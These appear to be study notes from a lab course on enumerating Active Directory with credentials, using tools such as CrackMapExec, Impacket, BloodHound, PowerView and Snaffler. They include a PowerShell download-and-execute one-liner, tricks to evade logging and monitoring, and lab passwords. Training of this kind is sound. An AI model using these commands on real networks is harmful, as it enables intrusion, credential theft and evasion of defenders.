                ------Credentialed Enumeration - from Linux


    
        \\\\CrackMapExec


    CrackMapExec (CME) is a powerful toolset to help with assessing AD environments. It utilizes packages from the Impacket and PowerSploit toolkits to perform its functions.


    CME offers a help menu for each protocol (i.e., crackmapexec winrm -h, etc.).


    -u Username The user whose credentials we will use to authenticate
    
    -p Password User's password
    
    Target (IP or FQDN) Target host to enumerate (in our case, the Domain Controller)
   
    --users Specifies to enumerate Domain Users
    
    --groups Specifies to enumerate domain groups
    
    --loggedon-users Attempts to enumerate what users are logged on to a target, if any

    
    \\CME - Domain User Enumeration

     Notice when it provides us the user information, it includes data points such as the badPwdCount attribute. This is helpful when performing actions like targeted password spraying. We could build a target user list filtering out any users with their badPwdCount attribute above 0 to be extra careful not to lock any accounts out.

     $ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

     We can also obtain a complete listing of domain groups.

     $ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

     Take note of key groups like Administrators, Domain Admins, Executives, any groups that may contain privileged IT admins, etc. 

     \\CME - Logged On Users

     $ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

     \\CME Share Searching

     $ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

      The module spider_plus will dig through each readable share on the host and list all readable files. Let's give it a try.

      $ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

      In the above command, we ran the spider against the Department Shares. When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/<ip of host>. 




            \\\\\\SMBMap


    Like CME, we can use SMBMap and a set of domain user credentials to check for accessible shares on remote systems.

    \\SMBMap To Check Access

    $ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

    \\Recursive List Of All Directories
    smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

    $ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only



            \\\\rpcclient

    rpcclient is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC

    Due to SMB NULL sessions (covered in-depth in the password spraying sections) on some of our hosts, we can perform authenticated or unauthenticated enumeration using rpcclient in the INLANEFREIGHT.LOCAL domain. An example of using rpcclient from an unauthenticated standpoint (if this configuration exists in our target domain) would be:

    $ rpcclient -U "" -N 172.16.5.5

    While looking at users in rpcclient, you may notice a field called rid: beside each user. A Relative Identifier (RID) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. To explain how this fits in, let's look at the examples below:

    The SID for the INLANEFREIGHT.LOCAL domain is: S-1-5-21-3842939050-3880317879-2865463114.
    When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
    So the domain user htb-student with a RID:[0x457] Hex 0x457 would = decimal 1111, will have a full user SID of: S-1-5-21-3842939050-3880317879-2865463114-1111.
    This is unique to the htb-student object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.



    However, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID [administrator] rid:[0x1f4], which, when converted to a decimal value, equals 500. The built-in Administrator account will always have the RID value Hex 0x1f4, or 500. This will always be the case. Since this value is unique to an object, we can use it to enumerate further information about it from the domain. Let's give it a try again with rpcclient. We will dig a bit targeting the htb-student user.


    \\RPCClient User Enumeration By RID

    rpcclient $> queryuser 0x457

     If we wished to enumerate all users to gather the RIDs for more than just one, we would use the enumdomusers command.

     rpcclient $> enumdomusers



        
                \\\\\Impacket Toolkit


        \\Psexec.py

     Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.

     To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.

     $ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  


        \\wmiexec.py

    Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.

    $ wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  


        \\Windapsearch

    Windapsearch is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.
    We have several options with Windapsearch to perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The --da (enumerate domain admins group members ) option and the -PU ( find privileged users) options. The -PU option is interesting because it will perform a recursive search for users with nested group membership.

    \\Windapsearch - Domain Admins

    $ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

    To identify more potential users, we can run the tool with the -PU flag and check for users with elevated privileges that may have gone unnoticed. This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.

    \\Windapsearch - Privileged Users

    $ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU


    

                \\\\\Bloodhound.py


        Once we have domain credentials, we can run the BloodHound.py BloodHound ingestor from our Linux attack host. The tool consists of two parts: the SharpHound collector written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using Cypher language. The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.



        Running bloodhound-python -h from our Linux attack host will show us the options available.

        As we can see the tool accepts various collection methods with the -c or --collectionmethod flag. We can retrieve specific data such as user sessions, users and groups, object properties, ACLS, or select all to gather as much data as possible. Let's run it this way.

        \\Executing BloodHound.py

        $ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

        The command above executed Bloodhound.py with the user forend. We specified our nameserver as the Domain Controller with the -ns flag and the domain, INLANEFREIGHt.LOCAL with the -d flag. The -c all flag told the tool to run all checks. Once the script finishes, we will see the output files in the current working directory in the format of <date_object.json>.

        \\Upload the Zip File into the BloodHound GUI

        We could then type sudo neo4j start to start the neo4j service, firing up the database we'll load the data into and also run Cypher queries against.

        Next, we can type bloodhound from our Linux attack host when logged in using freerdp to start the BloodHound GUI application and upload the data. The credentials are pre-populated on the Linux attack host, but if for some reason a credential prompt is shown, use:

    user == neo4j / pass == HTB_@cademy_stdnt!.

        Once all of the above is done, we should have the BloodHound GUI tool loaded with a blank slate. Now we need to upload the data. We can either upload each JSON file one by one or zip them first with a command such as zip -r ilfreight_bh.zip *.json and upload the Zip file. We do this by clicking the Upload Data button on the right side of the window (green arrow). When the file browser window pops up to select a file, choose the zip file (or each JSON file) (red arrow) and hit Open.

        Now that the data is loaded, we can use the Analysis tab to run queries against the database. These queries can be custom and specific to what you decide using custom Cypher queries (https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/). There are many great cheat sheets to help us here.  As seen below, we can use the built-in Path Finding queries on the Analysis tab on the Left side of the window.





                        ----Credential Enumeration from Windows



                \\ActiveDirectory PowerShell Module

        The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line. It consists of 147 different cmdlets at the time of writing.

        Before we can utilize the module, we have to make sure it is imported first. The Get-Module cmdlet, which is part of the Microsoft.PowerShell.Core module, will list all available modules, their version, and potential commands for use. 

        This is a great way to see if anything like Git or custom administrator scripts are installed. If the module is not loaded, run Import-Module ActiveDirectory to load it for use.

        \\Get Domain Info

        PS C:\htb> Get-ADDomain

        \\Get-ADUser

        PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

        \\Checking For Trust Relationships

        PS C:\htb> Get-ADTrust -Filter *

        \\Group Enumeration

        PS C:\htb> Get-ADGroup -Filter * | select name

        \\Detailed Group Info

        PS C:\htb> Get-ADGroup -Identity "Backup Operators"

        \\Group Membership

        PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"



                \\PowerView
        
        Command 	Description
Export-PowerViewCSV 	Append results to a CSV file
ConvertTo-SID 	        Convert a User or group name to its SID value
Get-DomainSPNTicket 	Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
Domain/LDAP Functions: 	
Get-Domain 	        Will return the AD object for the current (or specified) domain
Get-DomainController 	Return a list of the Domain Controllers for the specified domain
Get-DomainUser 	        Will return all users or specific user objects in AD
Get-DomainComputer 	Will return all computers or specific computer objects in AD
Get-DomainGroup 	Will return all groups or specific group objects in AD
Get-DomainOU 	        Search for all or specific OU objects in AD
Find-InterestingDomainAcl 	Finds object ACLs in the domain with modification rights set to non-built in objects
Get-DomainGroupMember 	Will return the members of a specific domain group
Get-DomainFileServer 	Returns a list of servers likely functioning as file servers
Get-DomainDFSShare 	Returns a list of all distributed file systems for the current (or specified) domain
GPO Functions: 	
Get-DomainGPO 	        Will return all GPOs or specific GPO objects in AD
Get-DomainPolicy 	Returns the default domain policy or the domain controller policy for the current domain
Computer Enumeration Functions: 	
Get-NetLocalGroup 	Enumerates local groups on the local or a remote machine
Get-NetLocalGroupMember 	Enumerates members of a specific local group
Get-NetShare 	        Returns open shares on the local (or a remote) machine
Get-NetSession 	        Will return session information for the local (or a remote) machine
Test-AdminAccess 	Tests if the current user has administrative access to the local (or a remote) machine
Threaded 'Meta'-Functions: 	
Find-DomainUserLocation 	Finds machines where specific users are logged in
Find-DomainShare 	Finds reachable shares on domain machines
Find-InterestingDomainShareFile 	Searches for files matching specific criteria on readable shares in the domain
Find-LocalAdminAccess 	Find machines on the local domain where the current user has local administrator access
Domain Trust Functions: 	
Get-DomainTrust 	Returns domain trusts for the current domain or a specified domain
Get-ForestTrust 	Returns all forest trusts for the current forest or a specified forest
Get-DomainForeignUser 	Enumerates users who are in groups outside of the user's domain
Get-DomainForeignGroupMember 	Enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainTrustMapping 	Will enumerate all trusts for the current domain and any others seen.


This table is not all-encompassing for what PowerView offers, but it includes many of the functions we will use repeatedly. For more on PowerView, check out the Active Directory PowerView module. 

https://academy.hackthebox.com/course/preview/active-directory-powerview


        \\Domain User Information

PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol


        \\Recursive Group Membership

Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups.

PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse


        \\Trust Enumeration

PS C:\htb> Get-DomainTrustMapping


        \\Testing for Local Admin Access

PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01


        \\Finding Users With SPN Set

PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName



                \\\\SharpView  



        Another tool worth experimenting with is SharpView, a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView. We can type a method name with -Help to get an argument list.

        PS C:\htb> .\SharpView.exe Get-DomainUser -Help


        PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend



                        \\\Snaffler


        Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.


        Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

        The -s tells it to print results to the console for us, the -d specifies the domain to search within, and the -o tells Snaffler to write results to a logfile. The -v option is the verbosity level. Typically data is best as it only displays results to the screen, so it's easier to begin looking through the tool runs. Snaffler can produce a considerable amount of data, so we should typically output to file and let it run and then come back to it later. It can also be helpful to provide Snaffler raw output to clients as supplemental data during a penetration test as it can help them zero in on high-value shares that should be locked down first.




                        \\\\BloodHound


        
        First, we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host.For our purposes, we will work with SharpHound.exe already on the attack host, but it's worth experimenting with transferring the tool to the attack host from Pwnbox or our own VM using methods such as a Python HTTP server, smbserver.py from Impacket, etc.

        \\SharpHound in Action

        PS C:\htb>  .\SharpHound.exe --help

        PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT


        Next, we can exfiltrate the dataset to our own VM or ingest it into the BloodHound GUI tool on MS01. We can do this on MS01 by typing bloodhound into a CMD or PowerShell console. The credentials should be saved, but enter neo4j: HTB_@cademy_stdnt! if a prompt appears. Next, click on the Upload Data button on the right-hand side, select the newly generated zip file, and click Open. An Upload Progress window will pop up. Once all .json files show 100% complete, click the X at the top of that window.

        We can start by typing domain: in the search bar on the top left

        Now, let's check out a few pre-built queries in the Analysis tab. The query Find Computers with Unsupported Operating Systems is great for finding outdated and unsupported operating systems running legacy software.


        Now, let's check out a few pre-built queries in the Analysis tab. The query Find Computers with Unsupported Operating Systems is great for finding outdated and unsupported operating systems running legacy software. 

        We can run the query Find Computers where Domain Users are Local Admin to quickly see if there are any hosts where all users have local admin rights.








                                \\\\\Living Off the Land





                \\Env Commands For Host & Network Recon

        \\Basic Enumeration Commands

        Command 	                                Result
hostname 	                                        Prints the PC's Name

[System.Environment]::OSVersion.Version 	        Prints out the OS version and revision level

wmic qfe get Caption,Description,HotFixID,InstalledOn 	Prints the patches and hotfixes applied to the host

ipconfig /all 	                                        Prints out network adapter state and configurations

set %USERDOMAIN% 	                                Displays the domain name to which the host belongs (ran from CMD-prompt)

set %logonserver% 	                                Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)



        The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information. We can cover the information above with one command systeminfo.


        The systeminfo command,will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.



                \\\Harnessing PowerShell


        Cmd-Let 	                Description
Get-Module 	                        Lists available modules loaded for use.
Get-ExecutionPolicy -List 	  Will print the execution policy settings for each scope on a host.
Set-ExecutionPolicy Bypass -Scope Process 	This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.

Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 	With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.

Get-ChildItem Env: | ft Key,Value 	Return environment values such as key paths, users, computer information, etc.

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" 	This is a quick and easy way to download a file from the web using PowerShell and call it from memory.



Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.


        \\Downgrade Powershell

        PS C:\htb> Get-host

        PS C:\htb> powershell.exe -version 2

        PS C:\htb> Get-host

        PS C:\htb> get-module


We can now see that we are running an older version of PowerShell from the output above. Notice the difference in the version reported. It validates we have successfully downgraded the shell. Let's check and see if we are still writing logs. The primary place to look is in the PowerShell Operational Log found under Applications and Services Logs > Microsoft > Windows > PowerShell > Operational. All commands executed in our session will log to this file

Be aware that the action of issuing the command powershell.exe -version 2 within the PowerShell session will be logged.



                \\Checking Defenses


        The next few commands utilize the netsh and sc utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.

        \\Firewall Checks

        PS C:\htb> netsh advfirewall show allprofiles

        \\Windows Defender Check (from CMD.exe)

        C:\htb> sc query windefend

        \\Get-MpComputerStatus

        Below we will check the status and configuration settings with the Get-MpComputerStatus cmdlet in PowerShell.

        PS C:\htb> Get-MpComputerStatus


                \\Am I Alone?

        When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.

        PS C:\htb> qwinsta

        Now that we have a solid feel for the state of our host, we can enumerate the network settings for our host and identify any potential domain machines or services we may want to target next.


        \\Network Information

        Networking Commands 	Description
arp -a 	                        Lists all known hosts stored in the arp table.

ipconfig /all 	                Prints out adapter settings for the host. We can figure out the network segment from here.

route print 	                Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.

netsh advfirewall show state 	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.


Commands such as ipconfig /all and systeminfo show us some basic networking configurations. Two more important commands provide us with a ton of valuable data and could help us further our access. arp -a and route print will show us what hosts the box we are on is aware of and what networks are known to the host. Any networks that appear in the routing table are potential avenues for lateral movement because they are accessed enough that a route was added, or it has administratively been set there so that the host knows how to access resources on the domain. These two commands can be especially helpful in the discovery phase of a black box assessment where we have to limit our scanning




            
                \\\\Windows Management Instrumentation (WMI)

        Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. 


        Command 	Description
wmic qfe get Caption,Description,HotFixID,InstalledOn 	Prints the patch level and description of the Hotfixes applied

wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List 	Displays basic host information to include any attributes within the list

wmic process list /format:list 	A listing of all processes on host

wmic ntdomain list /format:list 	Displays information about the Domain and Domain Controllers

wmic useraccount list /format:list 	Displays information about all local accounts and any domain accounts that have logged into the device

wmic group list /format:list 	Information about all local groups

wmic sysaccount list /format:list 	Dumps information about any system accounts that are being used as service accounts.


!!This cheatsheet has some useful commands for querying host and domain info using wmic.

https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4


Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. 

PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress



                \\\\Net Commands


        Net commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:

                Local and domain users
                Groups
                Hosts
                Specific users in groups
                Domain Controllers
                Password requirements

        We'll cover a few examples below. Keep in mind that net.exe commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as whoami, and net localgroup administrators, etc. This could be an obvious red flag to anyone monitoring the network heavily.


        \\\Table of Useful Net Commands

Command 	                Description
net accounts 	                         Information about password requirements
net accounts /domain 	                        Password and lockout policy
net group /domain 	                        Information about domain groups
net group "Domain Admins" /domain 	        List users with domain admin privileges
net group "domain computers" /domain 	        List of PCs connected to the domain
net group "Domain Controllers" /domain  	List PC accounts of domains controllers
net group <domain_group_name> /domain 	        User that belongs to the group
net groups /domain 	                        List of domain groups
net localgroup 	All available groups

net localgroup administrators /domain 	        List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)

net localgroup Administrators 	                Information about a group (admins)
net localgroup administrators [username] /add 	Add user to administrators
net share 	                                Check current shares
net user <ACCOUNT_NAME> /domain 	        Get information about a user within the domain
net user /domain 	                        List all users of the domain
net user %username% 	                        Information about the current user
net use x: \computer\share 	                Mount the share locally
net view 	                                Get a list of computers
net view /all /domain[:domainname] 	        Shares on the domains
net view \computer /ALL 	                List shares of a computer
net view /domain 	                        List of PCs of the domain



!!!Net Commands Trick

If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.



               \\\Dsquery


        Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, dsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at C:\Windows\System32\dsquery.dll.


        \\Dsquery DLL

        \User Search

        PS C:\htb> dsquery user

        \Computer Search

        PS C:\htb> dsquery computer

        \Wildcard Search

        PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

        \\Users With Specific Attributes Set (PASSWD_NOTREQD)

        PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

        \Searching for Domain Controllers

        The below search filter looks for all Domain Controllers in the current domain, limiting to five results.

        PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName


        OID match strings

OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

    1.2.840.113556.1.4.803

When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

    1.2.840.113556.1.4.804

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

    1.2.840.113556.1.4.1941

This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.



